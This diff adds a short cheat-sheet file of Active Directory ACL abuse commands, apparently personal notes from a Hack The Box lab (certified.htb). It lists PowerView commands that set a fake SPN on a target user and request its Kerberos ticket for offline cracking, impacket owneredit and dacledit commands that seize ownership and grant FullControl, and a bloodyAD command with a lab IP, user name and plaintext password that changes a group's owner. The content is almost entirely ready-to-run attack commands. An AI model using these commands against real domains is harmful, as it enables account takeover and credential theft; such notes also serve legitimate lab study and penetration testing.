@@ -1,0 +1,39 @@
+
+
+
+
+
+
+
+
+## GenericAll
+# Abuse GenericAll with PowerView (Evil-WinRM)
+$SecPassword = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\User', $SecPassword)
+Set-DomainObject -Credential $Cred -Identity TARGETUSER -SET @{serviceprincipalname='nonexistent/SPN'}
+Get-DomainSPNTicket -Credential $Cred TARGETUSER | fl
+
+# Impacket owneredit (grant ownership)
+impacket-owneredit -action write -owner 'attacker' -target 'victim' DOMAIN/USER:PASSWORD
+
+# Impacket dacledit (grant GenericAll/FullControl)
+impacket-dacledit -action write -rights FullControl -principal controlledUser -target targetUser DOMAIN/controlledUser:PASSWORD
+
+# PowerView (manual ACL abuse)
+Add-DomainObjectAcl -TargetIdentity TARGETUSER -PrincipalIdentity CONTROLLEDUSER -Rights All
+
+
+
+# The judith.mader user has WriteOwner ACL over the management group.
+bloodyAD --host "10.10.11.41" -d "certified.htb" -u "judith.mader" -p "judith09" set owner management judith.mader 
+
+
+
+The management group has GenericWrite ACL over the management_svc user.
+
+
+
+
+
+
+
